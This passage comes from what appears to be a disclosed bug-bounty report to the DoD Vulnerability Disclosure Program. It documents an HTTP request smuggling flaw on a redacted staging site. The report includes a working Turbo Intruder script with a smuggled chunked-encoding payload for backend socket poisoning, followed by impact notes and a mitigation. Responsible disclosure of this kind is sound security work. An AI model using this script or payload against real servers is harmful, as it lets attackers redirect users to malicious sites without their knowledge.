This means it's possible to send requests that are interpreted differently by the two servers, leading to backend socket poisoning.\n\n## Impact\nUnauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required.\n\n## Step-by-step Reproduction Instructions\nTo replicate this with minimal risk of affecting legitimate users we'll target stage.████████ instead of ██████████, and use the following turbo intruder script:\n\nI've hard-coded the endpoint to ██████████ because it appears that you've got multiple endpoints for stage.█████████ and some are not vulnerable.\n```\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint='https://██████████:443',\n                           concurrentConnections=5,\n                           requestsPerConnection=1,\n                           pipeline=False,\n                           maxRetriesPerRequest=0\n                           )\n    engine.start()    \n\n    attack = '''POST /████ HTTP/1.1\nFooz: bar\\nTransfer-Encoding: chunked\nHost: stage.█████\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nFoo: bar\n\n0\n\nGET███████ HTTP/1.1\nX: X'''\n\n    engine.queue(attack)\n\n    victim = '''GET /foo.jpg?x=%s HTTP/1.1\nHost: stage.████████\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: keep-alive\n\n'''\n    for i in range(15):\n        engine.queue(victim, i)\n        time.sleep(0.2)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n\n ```\nYou should observe that one of the responses to a victim request is a 302 redirect to █████████\n\n## Suggested Mitigation/Remediation Actions\nWhen I resolve stage.███ I get a bunch of IP addresses, and only some of these appear to be vulnerable. As such, you should be able to resolve this issue by making these servers consistent:\n\n```\nstage.████████.\t\t59\tIN\tA\t██████████\nstage.████.\t\t59\tIN\tA\t████████\nstage.█████.\t\t59\tIN\tA\t██████\nstage.███████.\t\t59\tIN\tA\t█████\nstage.████.\t\t59\tIN\tA\t██████████\nstage.██████████.\t\t59\tIN\tA\t█████\n```\n\n## Impact\n\nUnauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required. Socket poisoning also enables a variety of other attacks which I haven't time to explore on your site.","weakness":{"id":86,"name":"HTTP Request Smuggling"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":23,"voters":["mashoud1122","spam404","remonsec","mik317","0xelkomy","powerjacobb1","brodie_codie","domssilva","naategh","0xarrow","and 13 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4477096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.
